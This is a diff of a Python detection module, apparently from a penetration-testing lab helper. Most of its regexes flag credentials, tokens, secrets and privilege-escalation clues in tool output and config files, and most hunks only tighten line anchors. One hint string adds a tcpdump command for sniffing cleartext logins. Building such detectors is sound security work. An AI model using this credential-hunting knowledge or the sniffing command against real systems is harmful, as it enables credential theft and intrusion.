@@ -100,7 +100,7 @@ _AD = [
     # AND bracketed expressions like `[success=1 default=ignore]` (which
     # PAM allows and is common on modern Debian /etc/pam.d/common-auth).
     ("PAM misconfig", re.compile(
-        r'(?im)^\s*(auth|password)\s+(?:\[[^\]]+\]|\S+)'
+        r'(?im)^[ \t]*(auth|password)\s+(?:\[[^\]]+\]|\S+)'
         r'\s+(pam_permit\.so|pam_unix\.so[^\r\n]*?\bnullok(?:_secure)?)\b'
         r'([^\r\n]*)$')),
     # iter-189: Slack incoming webhook URL. Full URL is the secret - anyone
@@ -185,7 +185,7 @@ _AD = [
     # Windows LAPS v2 cleartext-after-decrypt output: 'Password : <pw>' under
     # 'ComputerName' / 'Account' block produced by Get-LapsADPassword -AsPlainText
     ("LAPS v2 cleartext", re.compile(
-        r'(?im)^\s*Password\s*:\s*([^\r\n]{6,80})$')),
+        r'(?im)^[ \t]*Password\s*:\s*([^\r\n]{6,80})$')),
     # gMSA managed password LDIF attribute (base64 blob; flag, don't try to decode).
     # The classic LDIF `::` prefix indicates base64; gMSADumper does the NTLM parse.
     ("gMSA ManagedPassword", re.compile(
@@ -296,7 +296,7 @@ _AD = [
     # MySQL/MariaDB option file [client] / [mysql] / [mysqldump] sections with
     # plaintext password=... (.my.cnf, /etc/mysql/debian.cnf).
     ("mysql client opt", re.compile(
-        r'(?im)^\s*password\s*=\s*["\']?([^"\'#\r\n]{3,80})["\']?\s*$')),
+        r'(?im)^[ \t]*password\s*=\s*["\']?([^"\'#\r\n]{3,80})["\']?\s*$')),
     # iter-26: .bash_history / .zsh_history / .fish_history typed creds.
     # Common shapes (per HTB/THM walkthroughs):
     #   mysql -u root -pP@ss123
@@ -457,7 +457,7 @@ _AD = [
     # Redis requirepass / masterauth in conf - already partially handled by KEY,
     # but here as a dedicated rule with a service-bound hint.
     ("redis requirepass", re.compile(
-        r'(?im)^\s*(requirepass|masterauth)\s+([^\s#]{3,80})')),
+        r'(?im)^[ \t]*(requirepass|masterauth)\s+([^\s#]{3,80})')),
     # /etc/sudoers NOPASSWD entry: gives `user` direct root via the named cmd
     # without a password - a single-line privesc primitive.
     ("sudoers NOPASSWD", re.compile(
@@ -503,7 +503,7 @@ _AD = [
     # Kubeconfig bearer token: `token: <jwt>` under user.token, or
     # `client-certificate-data: <b64>` + `client-key-data: <b64>` under user.
     ("kubeconfig token", re.compile(
-        r'(?im)^\s*token\s*:\s*([A-Za-z0-9._-]{32,})\s*$')),
+        r'(?im)^[ \t]*token\s*:\s*([A-Za-z0-9._-]{32,})\s*$')),
     # iter-27: ~/.docker/config.json auth b64. Shape:
     #   "auths": {"registry.io": {"auth": "dXNlcjpwYXNz"}}
     # The b64 decodes to user:password for direct registry auth. Also
@@ -515,13 +515,13 @@ _AD = [
     # etc). Also covers ansible_ssh_pass (older name) and
     # ansible_winrm_password / ansible_become_password.
     ("ansible var pass", re.compile(
-        r'(?im)^\s*(ansible_(?:become_(?:pass(?:word)?)?|ssh_pass|password|'
+        r'(?im)^[ \t]*(ansible_(?:become_(?:pass(?:word)?)?|ssh_pass|password|'
         r'winrm_pass(?:word)?|paramiko_pass))\s*[:=]\s*'
         r'["\']?([^\s"\'#\r\n]{3,80})["\']?\s*$')),
     # iter-27: GitLab runner config.toml token entry. The [[runners]]
     # section carries `token = "..."` which auths the runner to GitLab.
     ("gitlab runner token", re.compile(
-        r'(?im)^\s*token\s*=\s*"([A-Za-z0-9_-]{20,})"\s*$')),
+        r'(?im)^[ \t]*token\s*=\s*"([A-Za-z0-9_-]{20,})"\s*$')),
     # iter-27: Chef data_bags encrypted secret (marker). Just flag as
     # INTERESTING; decryption requires the org's shared secret key.
     ("chef databag marker", re.compile(
@@ -534,7 +534,7 @@ _AD = [
     #   Environment="POSTGRES_PASSWORD=P@ss word"
     # Also matches ExecStart lines with inline env prefix.
     ("systemd Environment=", re.compile(
-        r'(?im)^\s*Environment\s*=\s*"?'
+        r'(?im)^[ \t]*Environment\s*=\s*"?'
         r'([A-Z][A-Z0-9_]{2,40}(?:PASS(?:WORD)?|PWD|SECRET|TOKEN|KEY|CRED))'
         r'=([^"\r\n]{3,200})"?\s*$')),
     # iter-28: RabbitMQ definitions.json users array - handled in
@@ -543,26 +543,26 @@ _AD = [
     # ~/.netrc format but scoped to APT: 'machine host login user password X'.
     # Common on THM/OSCP+ boxes with private APT repos.
     ("apt auth machine", re.compile(
-        r'(?im)^\s*machine\s+(\S+)\s+login\s+(\S+)\s+password\s+(\S+)\s*$')),
+        r'(?im)^[ \t]*machine\s+(\S+)\s+login\s+(\S+)\s+password\s+(\S+)\s*$')),
     # iter-29: HAProxy userlist entry: 'user admin insecure-password P@ss' or
     # 'user admin password $6$...'. Only fire on the insecure-password form
     # (the hashed form is caught by patterns.py bcrypt/sha512crypt rules).
     ("haproxy user insecure", re.compile(
-        r'(?im)^\s*user\s+(\S{1,50})\s+insecure-password\s+(\S{3,80})')),
+        r'(?im)^[ \t]*user\s+(\S{1,50})\s+insecure-password\s+(\S{3,80})')),
     # iter-29: rsyncd.conf 'secrets file' pointer - flag the referenced path.
     ("rsyncd secrets pointer", re.compile(
-        r'(?im)^\s*secrets\s+file\s*=\s*(\S{3,200})\s*$')),
+        r'(?im)^[ \t]*secrets\s+file\s*=\s*(\S{3,200})\s*$')),
     # iter-29: Postfix smtp_sasl_password_maps: pointer to a hash file that
     # holds 'smtp.example.com user:password' rows.
     ("postfix sasl map", re.compile(
-        r'(?im)^\s*smtp_sasl_password_maps\s*=\s*hash:\s*(\S{3,200})\s*$')),
+        r'(?im)^[ \t]*smtp_sasl_password_maps\s*=\s*hash:\s*(\S{3,200})\s*$')),
     # iter-202: Redis Sentinel `sentinel auth-pass <mastername> <password>`
     # line. Common on Redis HA setups (sentinel + master + replicas). The
     # pw is used for Sentinel <-> replica auth. Also handles Sentinel 6+
     # variants like `sentinel deny-scripts-reconfig` (which we filter out
     # via the required "auth-pass" keyword).
     ("Redis Sentinel auth-pass", re.compile(
-        r'(?im)^\s*sentinel\s+auth-pass\s+([A-Za-z_][\w.-]{1,60})\s+'
+        r'(?im)^[ \t]*sentinel\s+auth-pass\s+([A-Za-z_][\w.-]{1,60})\s+'
         r'([^\s#\r\n]{3,80})\s*(?:#[^\r\n]*)?$')),
     # iter-202: HashiCorp Vault token file. `~/.vault-token` is a 1-line
     # file containing the raw token used by `vault` CLI. Also matches
@@ -578,18 +578,18 @@ _AD = [
     # iter-29: haproxy stats socket admin password: 'stats admin if TRUE ...'
     # or 'stats auth admin:P@ss' style
     ("haproxy stats auth", re.compile(
-        r'(?im)^\s*stats\s+auth\s+(\S{1,50}):(\S{3,80})\s*$')),
+        r'(?im)^[ \t]*stats\s+auth\s+(\S{1,50}):(\S{3,80})\s*$')),
     # iter-32: Java Spring application.properties datasource passwords.
     # Also covers Micronaut / Quarkus (same dot-property shape).
     ("spring datasource props", re.compile(
-        r'(?im)^\s*(?:spring\.datasource(?:\.\w+)?|datasources\.\w+|'
+        r'(?im)^[ \t]*(?:spring\.datasource(?:\.\w+)?|datasources\.\w+|'
         r'quarkus\.datasource(?:\.\w+)?|micronaut\.datasources\.\w+)'
         r'\.(?:password|pwd)\s*=\s*(\S{3,200})\s*$')),
     # iter-32: Python framework SECRET_KEY (Django settings.py, Flask
     # config.py). Also covers FastAPI, Starlette. 16-char minimum to avoid
     # placeholder trigger 'CHANGE_ME'-style short values.
     ("python SECRET_KEY", re.compile(
-        r'(?im)^\s*(SECRET_KEY|JWT_SECRET_KEY|SECURITY_PASSWORD_SALT|'
+        r'(?im)^[ \t]*(SECRET_KEY|JWT_SECRET_KEY|SECURITY_PASSWORD_SALT|'
         r'CSRF_SECRET|SESSION_SECRET|FLASK_SECRET)'
         r'\s*=\s*["\']([^"\'\r\n]{16,200})["\']')),
     # iter-32: uppercase-PASSWORD dict entry - Django DATABASES {"PASSWORD":
@@ -662,15 +662,17 @@ _AD = [
         r'<SS\s+N\s*=\s*"Password"\s*>([0-9a-f]{40,})</SS>')),
     # OpenVPN auth-user-pass file (two lines: user, pass)
     ("ovpn auth-user-pass", re.compile(
-        r'(?im)^\s*auth-user-pass\s+(\S+)\s*$')),
+        r'(?im)^[ \t]*auth-user-pass\s+(\S+)\s*$')),
     # WireGuard PrivateKey in [Interface]
     ("WireGuard PrivateKey", re.compile(
-        r'(?im)^\s*PrivateKey\s*=\s*([A-Za-z0-9+/]{42,44}=)\s*$')),
+        r'(?im)^[ \t]*PrivateKey\s*=\s*([A-Za-z0-9+/]{42,44}=)\s*$')),
     # NetSCREEN / Cisco IOS enable secret 5/7
     ("Cisco enable secret", re.compile(
         r'(?i)\benable\s+secret\s+(\d)\s+([\S]{6,200})')),
     # JuicyPotato / Print Spooler / SeImpersonate output that lists a token to
     # impersonate. Intel-only.
+    # (see _PRIV_MARKER_NAMES below: these stand down on table rows that
+    # analyzers/privesc.py parses, to avoid double-reporting.)
     ("token impersonation", re.compile(
         r'(?i)SeImpersonatePrivilege|SeAssignPrimaryToken|JuicyPotato\.exe|PrintSpoofer\.exe|GodPotato\.exe|RoguePotato\.exe')),
     # iter-163: SeBackupPrivilege - Backup Operators / hive-save primitive.
@@ -830,7 +832,7 @@ _AD = [
         r'"encryptedUsername"\s*:\s*"(M[A-Za-z0-9+/=]{20,})"')),
     # Browser password export CSV header - flag the file (rows follow)
     ("browser password CSV", re.compile(
-        r'(?im)^\s*name\s*,\s*url\s*,\s*username\s*,\s*password\s*$')),
+        r'(?im)^[ \t]*name\s*,\s*url\s*,\s*username\s*,\s*password\s*$')),
     # PowerShell one-liner: New-Object PSCredential("user", (ConvertTo-SecureString -String "X" -AsPlainText))
     # Two-group capture; needs dispatch.
     ("PS PSCredential inline", re.compile(
@@ -851,7 +853,7 @@ _AD = [
         r'(?i)basicAuthPassword\s*:\s*["\']?([^\s"\'\r\n#]{3,80})')),
     # Splunk passwd / authentication.conf default admin password (already-hashed sha512crypt):
     ("Splunk authentication", re.compile(
-        r'(?im)^\s*passwd\s*=\s*(\$6\$[\$\w./]{20,})$')),
+        r'(?im)^[ \t]*passwd\s*=\s*(\$6\$[\$\w./]{20,})$')),
     # SCCM CMG token in MEMCM log (eyJ... JWT) - distinctive prefix gate
     ("SCCM CMG token", re.compile(
         r'(?i)\b(?:CMG|CCM)\s*token\s*[:=]\s*(eyJ[A-Za-z0-9_\-\.]{20,})')),
@@ -867,7 +869,7 @@ _AD = [
         r'(?i)http\.[^\s=]+\.extraheader\s*=\s*AUTHORIZATION:\s*\w+\s+(\S+)')),
     # rclone.conf saved cloud token (one-line shape)
     ("rclone token", re.compile(
-        r'(?im)^\s*token\s*=\s*\{["\']access_token["\']\s*:\s*["\']([^"\']{20,})["\']')),
+        r'(?im)^[ \t]*token\s*=\s*\{["\']access_token["\']\s*:\s*["\']([^"\']{20,})["\']')),
     # ---- iter-11 deep-corpus adds (audit wijdgt0aa) ----
     # AAD / MSA refresh token (AzureAD / Office 365 token endpoint reply).
     # `0.AVoA...`, `M.XXX...`, `1.AVoA...` are the canonical leading-byte forms.
@@ -905,7 +907,7 @@ _AD = [
     # style). Match attribute names ending in -Pwd/-Password/-Pass and decode
     # a base64-or-text value.
     ("AD custom-attr b64 password", re.compile(
-        r'(?im)^\s*([a-z][\w\-]*(?:Pwd|Password|Pass))\s*:\s*([A-Za-z0-9+/=]{8,200})\s*$')),
+        r'(?im)^[ \t]*([a-z][\w\-]*(?:Pwd|Password|Pass))\s*:\s*([A-Za-z0-9+/=]{8,200})\s*$')),
     # netsh wlan show profile key=clear console output: 'Key Content: <psk>'
     ("netsh wlan Key Content", re.compile(
         r'(?im)^[ \t]*Key\s+Content[ \t]*:[ \t]*([^\r\n]{8,63})[ \t]*$')),
@@ -953,16 +955,16 @@ _AD = [
     # Jenkins build env dump: `BUILD_USER_EMAIL=...`, `_JOB_PASSWORD=...`,
     # `_CRED_PASSWORD=...` - if a secret leaks here, it's plaintext.
     ("Jenkins build env secret", re.compile(
-        r'(?im)^\s*\w*(?:JOB|BUILD|CRED|SCRIPT)_(?:PASSWORD|PASS|TOKEN|SECRET|KEY|API_KEY)'
+        r'(?im)^[ \t]*\w*(?:JOB|BUILD|CRED|SCRIPT)_(?:PASSWORD|PASS|TOKEN|SECRET|KEY|API_KEY)'
         r'\s*=\s*([^\s\r\n]{6,200})\s*$')),
     # AWS shared-config profile with role_arn + source_profile (multi-account
     # pivot path). Distinctive 'role_arn = arn:aws:iam::...:role/...' line.
     ("AWS assume-role profile", re.compile(
-        r'(?im)^\s*role_arn\s*=\s*(arn:aws:iam::\d{12}:role/[\w+=,.@/-]{1,80})\s*$')),
+        r'(?im)^[ \t]*role_arn\s*=\s*(arn:aws:iam::\d{12}:role/[\w+=,.@/-]{1,80})\s*$')),
     # Terraform .tfvars secret line (var name typically ends in _password /
     # _secret / _key / _token).
     ("Terraform tfvars secret", re.compile(
-        r'(?im)^\s*([A-Za-z][A-Za-z0-9_]*(?:_password|_secret|_key|_token|_pwd))\s*=\s*'
+        r'(?im)^[ \t]*([A-Za-z][A-Za-z0-9_]*(?:_password|_secret|_key|_token|_pwd))\s*=\s*'
         r'["\']([^"\'\r\n]{6,200})["\']')),
     # Consul ACL token (UUID v4 shape) - common HashiCorp loot
     ("Consul ACL token", re.compile(
@@ -1030,7 +1032,7 @@ _AD = [
     # Format: `<perms> <size> <DOW> <Mon> <Day> <HH:MM:SS> <YYYY> <name>`
     # Catch sensitive-named files (passwords/creds/backups/keys).
     ("smbmap -R sensitive file", re.compile(
-        r'(?im)^\s*[wfdr\-]+\s+\d+\s+\w{3}\s+\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}\s+\d{4}\s+'
+        r'(?im)^[ \t]*[wfdr\-]+\s+\d+\s+\w{3}\s+\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}\s+\d{4}\s+'
         r'([^\r\n]*?(?:passwd|password|users?\.txt|backup|cred|secret|'
         r'unattend|\.kdbx|\.pfx|\.p12|\.kirbi|\.ccache|id_rsa|\.bak|'
         r'groups\.xml|web\.config|\.config|\.keytab)[^\r\n]*?)\s*$')),
@@ -1038,7 +1040,7 @@ _AD = [
     # Elastix / FreePBX amportal.conf AMPDBPASS / AMPMGRPASS / AMPMYSQL_PASS
     # (HTB Beep / lab-style PBX boxes - typical foothold → root reuse pattern)
     ("Elastix AMPDBPASS", re.compile(
-        r'(?im)^\s*AMP(?:DBPASS|MGRPASS|MYSQL_PASS)\s*=\s*([^\s#\r\n]{3,80})')),
+        r'(?im)^[ \t]*AMP(?:DBPASS|MGRPASS|MYSQL_PASS)\s*=\s*([^\s#\r\n]{3,80})')),
     # PHP bracketed-array secret: $cfg['db_password'] = 'X'  /
     # $cfg['DB_PASSWORD']="X"  (vtigercrm / Roundcube / Sentinel-style).
     # Different from the existing 'PHP array secret' rule (fat-arrow '=>').
@@ -1113,7 +1115,7 @@ _AD = [
         re.MULTILINE)),
     # Rubeus dump 'Base64EncodedTicket :' label (header-only; b64 follows)
     ("Rubeus dump ticket", re.compile(
-        r'(?im)^\s*Base64EncodedTicket\s*:\s*$')),
+        r'(?im)^[ \t]*Base64EncodedTicket\s*:\s*$')),
     # Snaffler annotated (FileResult)[File] {Color}<rule|R|kB|mtime|path> format
     ("Snaffler annotated", re.compile(
         r'\((?:FileResult|RwStatusResult|ShareResult|DirResult)\)'
@@ -1137,7 +1139,7 @@ _AD = [
     #      require an absolute path in sudoers, and sudoedit /etc/shadow /
     #      sudoedit /root/... is an instant root read primitive.
     ("sudo -l NOPASSWD", re.compile(
-        r'(?im)^\s*\(([^)\r\n]{1,80})\)\s+(?:NOPASSWD|SETENV)\s*:\s*'
+        r'(?im)^[ \t]*\(([^)\r\n]{1,80})\)\s+(?:NOPASSWD|SETENV)\s*:\s*'
         r'((?:/\S|sudoedit\b)[^\r\n]{0,200})')),
     # HTB Lame / smbclient / enum4linux Samba banner (CVE-2007-2447 range):
     #     Server=[Samba 3.0.20-Debian]
@@ -1164,7 +1166,7 @@ _AD = [
     # _multiline_passes() below (per-line _AD loop can't see across lines).
     # Steghide info / extract output (rijndael fingerprint is unique)
     ("Steghide artifact", re.compile(
-        r'(?im)^\s*encrypted\s*:\s*rijndael-(?:128|192|256),\s*(?:cbc|ecb)\b')),
+        r'(?im)^[ \t]*encrypted\s*:\s*rijndael-(?:128|192|256),\s*(?:cbc|ecb)\b')),
     # PHP wrapper LFI URL (php://filter/convert.base64-encode/resource=...)
     ("PHP wrapper LFI", re.compile(
         r'(?i)\b(?:php://(?:filter|input|expect)/[^\s\'"<>]{1,300}|'
@@ -1237,7 +1239,7 @@ _SCCM_NAA_MULTI = re.compile(
 # Only fire in _multiline_passes() AND only on file paths that look like
 # a CIFS creds file (filename gate applied at dispatch).
 _CIFS_CREDS = re.compile(
-    r'(?im)^\s*(?:username|user)\s*=\s*([^\s#\r\n]{1,60})\s*(?:#[^\r\n]*)?\s*\n'
+    r'(?im)^[ \t]*(?:username|user)\s*=\s*([^\s#\r\n]{1,60})\s*(?:#[^\r\n]*)?\s*\n'
     r'[\s\S]{0,200}?'
     r'^\s*(?:password|pass|pw)\s*=\s*([^\s#\r\n]{3,80})'
     r'(?:[\s\S]{0,200}?^\s*(?:domain|dom|workgroup)\s*=\s*([^\s#\r\n]{1,60}))?'
@@ -1295,7 +1297,7 @@ _HTPASSWD_LINE = re.compile(
 # iter-198: Windows systeminfo output - `OS Name:` + `OS Version:` header.
 # Multi-line: OS Name row + a few info rows + OS Version row.
 _WINDOWS_SYSTEMINFO = re.compile(
-    r'(?im)^\s*OS Name\s*:\s*(Microsoft[^\r\n]{5,80})\s*\r?\n'
+    r'(?im)^[ \t]*OS Name\s*:\s*(Microsoft[^\r\n]{5,80})\s*\r?\n'
     r'(?:[^\r\n]*\r?\n){0,4}'
     r'^\s*OS Version\s*:\s*(\d+\.\d+\.\d+)([^\r\n]{0,80})'
 )
@@ -1309,7 +1311,7 @@ _WINDOWS_SYSTEMINFO = re.compile(
 # `admin_password = admin` is the DEFAULT (never rotated on stock installs)
 # so we flag it CRITICAL even when it looks placeholder-ish.
 _GRAFANA_ADMIN = re.compile(
-    r'(?im)^\s*\[security\]\s*\r?\n'
+    r'(?im)^[ \t]*\[security\]\s*\r?\n'
     r'(?:(?!\n\s*\[)[\s\S]){0,400}?'
     r'^\s*admin_user\s*=\s*([^\s#\r\n]{1,60})\s*(?:#[^\r\n]*)?\s*\r?\n'
     r'(?:(?!\n\s*\[)[\s\S]){0,400}?'
@@ -1324,7 +1326,7 @@ _GRAFANA_ADMIN = re.compile(
 # The URL-with-creds regex in patterns.py catches these but we want a
 # dedicated hit with the Airflow context for the report.
 _AIRFLOW_CONN = re.compile(
-    r'(?im)^\s*sql_alchemy_conn\s*=\s*'
+    r'(?im)^[ \t]*sql_alchemy_conn\s*=\s*'
     r'([a-z][a-z0-9+.\-]{2,20})://'
     r'([^:/@\s]+):([^@/\s]{3,80})@'
     r'([^:/\s]+)(?::(\d+))?'
@@ -1372,7 +1374,7 @@ _OPENSSH_BANNER = re.compile(
 # Vulnerable to CVE-2021-3156 (Baron Samedit): 1.8.2 through 1.9.5p1
 # inclusive - a decade of sudo builds. Also 1.9.5p2 fixed it.
 _SUDO_VERSION = re.compile(
-    r'(?im)^\s*Sudo\s+version\s+(\d+)\.(\d+)\.(\d+)(?:p(\d+))?\b'
+    r'(?im)^[ \t]*Sudo\s+version\s+(\d+)\.(\d+)\.(\d+)(?:p(\d+))?\b'
 )
 
 # iter-197: Linux kernel version extraction. Covers:
@@ -1417,7 +1419,7 @@ _PFSENSE_USER = re.compile(
 #   username = __token__
 #   password = pypi-AgENdGVzdC5weXBpLm9yZ...
 _PYPIRC_BLOCK = re.compile(
-    r'(?im)^\s*\[(pypi|testpypi|[a-zA-Z0-9._-]{1,40})\]\s*\r?\n'
+    r'(?im)^[ \t]*\[(pypi|testpypi|[a-zA-Z0-9._-]{1,40})\]\s*\r?\n'
     r'(?:(?!\n\s*\[)[\s\S]){0,300}?'
     r'^\s*username\s*[:=]\s*([^\s#\r\n]{1,60})\s*\r?\n'
     r'(?:(?!\n\s*\[)[\s\S]){0,300}?'
@@ -1432,7 +1434,7 @@ _PYPIRC_BLOCK = re.compile(
 # Also `discovery.sendtargets.auth.username/password` for target discovery.
 # Multi-line: username and password rows can be separated by other options.
 _ISCSI_AUTH = re.compile(
-    r'(?im)^\s*(node|discovery)\.[a-z_]+\.auth\.username(?:_in)?\s*=\s*'
+    r'(?im)^[ \t]*(node|discovery)\.[a-z_]+\.auth\.username(?:_in)?\s*=\s*'
     r'([^\s#\r\n]{1,80})\s*(?:#[^\r\n]*)?\s*\n'
     r'(?:(?!\n\s*(?:node|discovery)\.[a-z_]+\.auth\.username)[\s\S]){0,400}?'
     r'^\s*(?:node|discovery)\.[a-z_]+\.auth\.password(?:_in)?\s*=\s*'
@@ -1450,7 +1452,7 @@ _ISCSI_AUTH = re.compile(
 #   elasticsearch.password: X                          (Kibana)
 #   xpack.reporting.encryptionKey: X
 _ES_XPACK_PW = re.compile(
-    r'(?im)^\s*'
+    r'(?im)^[ \t]*'
     r'((?:xpack\.[a-z._]+\.(?:password|encryption[_-]?key|secret[_-]?key)|'
     r'elasticsearch\.password|elastic(?:\.username|\.password)?|'
     r'kibana\.password|logstash\.password))'
@@ -1486,7 +1488,7 @@ _PPP_SECRETS = re.compile(
 # past a sibling profile (whose secret is malformed) and are pairing this
 # profile's header with the NEXT profile's secret.
 _AWS_CREDS_INI = re.compile(
-    r'(?im)^\s*\[(?:profile\s+)?([\w.-]{1,60})\]\s*\r?\n'
+    r'(?im)^[ \t]*\[(?:profile\s+)?([\w.-]{1,60})\]\s*\r?\n'
     r'(?:(?!\n\s*\[)[\s\S]){0,400}?'
     r'^\s*aws_access_key_id\s*[:=]\s*(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})\s*\r?\n'
     r'(?:(?!\n\s*\[)[\s\S]){0,400}?'
@@ -1799,9 +1801,15 @@ _LINUX_CAPS = {
     "cap_fowner": "bypass fowner check - chmod any file",
     "cap_kill": ("SIGKILL any process (incl. root daemons); "
                   "shutdown auth for reset attack"),
-    "cap_net_raw": ("raw sockets - packet sniffing / ARP spoof; "
-                     "extract creds off the wire"),
-    "cap_net_bind_service": "bind low ports without root (e.g., DNS spoof)",
+    # iter-311: removed "ARP spoof" / "DNS spoof" wording - IP/ARP/DNS/NBNS
+    # spoofing is prohibited on the OSCP+ exam and hint= strings are not
+    # linted, so the hint text itself is the only guard. These network
+    # caps are NOT a privesc primitive; the dispatcher skips them when
+    # they are the only caps on a binary (stock ping/mtr/arping noise).
+    "cap_net_raw": ("raw sockets only - NOT a privesc; passive capture on "
+                     "a box you already own: tcpdump -i any -A 'port 21 or "
+                     "port 23 or port 110 or port 143' for cleartext creds"),
+    "cap_net_bind_service": "bind ports <1024 without root - NOT a privesc",
     "cap_net_admin": "manage networking - iptables/nftables/tc control",
     "cap_sys_time": ("change system time - may bypass ticket expiry "
                       "or lockout counters"),
@@ -1819,7 +1827,7 @@ _POSTFIX_SASL = re.compile(
     # IPv6 relays `[2001:db8::1]:587` match. IPv6 hosts inside `[...]`
     # brackets can't collide with the port separator because the port
     # sits OUTSIDE the brackets in the sasl_passwd format.
-    r'(?m)^\s*\[([\w.:\-]+)\](?::(\d{1,5}))?\s+'
+    r'(?m)^[ \t]*\[([\w.:\-]+)\](?::(\d{1,5}))?\s+'
     r'([^\s:@]{1,60})(?:@[\w.\-]+)?:'
     r'([^\s#\r\n]{3,80})\s*$'
 )
@@ -1830,7 +1838,7 @@ _POSTFIX_SASL = re.compile(
 # boxes (TryHackMe LDAP labs, INE eJPT Directory Services labs).
 # Two shapes because slapd.conf uses whitespace and LDIF uses `:` / `::`.
 _LDAP_ROOTPW = re.compile(
-    r'(?im)^\s*(?:rootpw|olcRootPW)\s*(::?|\s+)\s*'
+    r'(?im)^[ \t]*(?:rootpw|olcRootPW)\s*(::?|\s+)\s*'
     r'([^\s#\r\n]{3,200})\s*$'
 )
 
@@ -1874,7 +1882,7 @@ _RADIUS_CLIENT = re.compile(
 # a successful connect - even without INFO, having the prompt confirms
 # unauth or at-least ACL-list-accessible.
 _REDIS_UNAUTH_INFO = re.compile(
-    r'(?im)^\s*redis_version\s*:\s*(\d+\.\d+(?:\.\d+)?)'
+    r'(?im)^[ \t]*redis_version\s*:\s*(\d+\.\d+(?:\.\d+)?)'
 )
 # `<host_or_ip>:<port>>` interactive prompt. Bounded host chars to
 # reduce FP on generic `x:y>` shapes.
@@ -1893,7 +1901,7 @@ _REDIS_CLI_PROMPT = re.compile(
 #   * `Authentication failed`
 #   * `requires authentication`
 _MONGO_SHOW_DBS_ROW = re.compile(
-    r'(?im)^\s*(admin|local|config)\s+'
+    r'(?im)^[ \t]*(admin|local|config)\s+'
     r'(\d+(?:\.\d+)?)\s*(?:B|KB|MB|GB|TB)\s*$'
 )
 _MONGO_SHELL_BANNER = re.compile(
@@ -1921,7 +1929,7 @@ _ES_VERSION_NUMBER = re.compile(
 # _cat/indices output row shape: `<health> <status> <index> <uuid> ...`
 # where health is green/yellow/red and status is open/close.
 _ES_CAT_INDICES = re.compile(
-    r'(?m)^\s*(green|yellow|red)\s+(open|close)\s+([\w.\-]{1,80})\s+'
+    r'(?m)^[ \t]*(green|yellow|red)\s+(open|close)\s+([\w.\-]{1,80})\s+'
     r'([\w\-]{4,32})\s+\d+\s+\d+\s+\d+'
 )
 
@@ -1942,7 +1950,7 @@ _AJP_JSERV = re.compile(
     r'(?i)Apache\s+Jserv\s*\(\s*Protocol\s+v?1\.3\s*\)'
 )
 _AJP_PORT_LINE = re.compile(
-    r'(?im)^\s*8009/tcp\s+open\s+ajp'
+    r'(?im)^[ \t]*8009/tcp\s+open\s+ajp'
 )
 # gnmap-style row: `Host: <ip> ... 8009/open/tcp//ajp13//Apache Jserv/`
 _AJP_GNMAP = re.compile(
@@ -2107,7 +2115,7 @@ _PHP_XPB = re.compile(
 # executable code. Very narrow: `<?php\s+` on a line boundary (real
 # response) NOT preceded by any script-tag prose context.
 _PHP_SRC_LEAK = re.compile(
-    r'(?m)^\s*<\?php\s+(?:\$|echo|include|require|declare|namespace)'
+    r'(?m)^[ \t]*<\?php\s+(?:\$|echo|include|require|declare|namespace)'
 )
 
 # iter-234: modern web-app version-banner CVE hints. Payload IOCs
@@ -2223,7 +2231,7 @@ _NC_LISTENER = re.compile(
     # `nc -lvnp` prints `listening on [any] 4444 ...` (trailing
     # ellipsis). Don't anchor at end of line - the trailing `...`
     # broke `\\s*$`.
-    r'(?im)^\s*listening\s+on\s+(?:\S+\s+)?(\d{1,5})\b'
+    r'(?im)^[ \t]*listening\s+on\s+(?:\S+\s+)?(\d{1,5})\b'
 )
 _NC_CONNECT = re.compile(
     r'(?im)connect\s+to\s+\[([\d.:a-fA-F]{3,45})\]\s+from\s+'
@@ -2260,9 +2268,9 @@ _MSSQL_SHELL_PROMPT = re.compile(
 #   dcomexec: `[!] Executing shell commands on <target>` (MMC20 / ShellWindows /
 #             ShellBrowserWindow object routing)
 _IMPACKET_ATEXEC = re.compile(
-    r'(?im)^\s*\[\*\]\s*Creating\s+task\s+\\(\w{4,32})\s*$')
+    r'(?im)^[ \t]*\[\*\]\s*Creating\s+task\s+\\(\w{4,32})\s*$')
 _IMPACKET_DCOMEXEC = re.compile(
-    r'(?im)^\s*\[!\]\s*Executing\s+shell\s+commands\s+on\s+'
+    r'(?im)^[ \t]*\[!\]\s*Executing\s+shell\s+commands\s+on\s+'
     r'([\w.\-]{2,60})\s*(?:\.\.\.)?$')
 
 # iter-257: Windows autorun / scheduled task privesc detectors.
@@ -2314,7 +2322,7 @@ _SCHTASKS_QUERY_BLOCK = re.compile(
 _UNQUOTED_SERVICE = re.compile(
     # sc qc format: `BINARY_PATH_NAME   : C:\Program Files\App\svc.exe -args`
     # unquoted + has space + not starting with " = hijack candidate
-    r'(?im)^\s*BINARY_PATH_NAME\s*:\s*'
+    r'(?im)^[ \t]*BINARY_PATH_NAME\s*:\s*'
     r'(?!["])(C:\\[^"\r\n]{1,50}\s[^"\r\n]{1,150}\.exe)'
 )
 # Signal B: `Get-ServiceUnquoted` PowerUp result
@@ -2335,7 +2343,7 @@ _WINPEAS_MODIFIABLE_SVC = re.compile(
     # prefix + inner alternation. Prefix decorations widened to
     # include `==`/`--`/`##` since winPEAS/linPEAS use those as
     # section-header delimiters.
-    r'(?im)^\s*(?:\|_?\s*|=+\s*|-+\s*|#+\s*)?Modifiable\s+services?'
+    r'(?im)^[ \t]*(?:\|_?\s*|=+\s*|-+\s*|#+\s*)?Modifiable\s+services?'
     r'\s*(?:=+\s*)?[\r\n]|'
     r'^\s*(?:\[\+\]\s+)?Services\s+with\s+writable\s+'
     r'(?:BinaryPath|Path|Config)'
@@ -2574,14 +2582,14 @@ _SMB_LOOT_FILENAMES = (
 )
 # smbclient ls output row: `<name>   A     <size>   <date>`
 _SMB_CLIENT_LS = re.compile(
-    r'(?im)^\s*(' + _SMB_LOOT_FILENAMES + r')\s+'
+    r'(?im)^[ \t]*(' + _SMB_LOOT_FILENAMES + r')\s+'
     r'[AHRSDNn]{1,7}\s+\d+\s+(?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s+'
     r'(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)'
 )
 # Windows dir /s output row:
 #   `MM/DD/YYYY  HH:MM AM         1,024 filename.ext`
 _WIN_DIR_LS = re.compile(
-    r'(?im)^\s*\d{1,2}/\d{1,2}/\d{4}\s+\d{1,2}:\d{2}\s+[AP]M\s+'
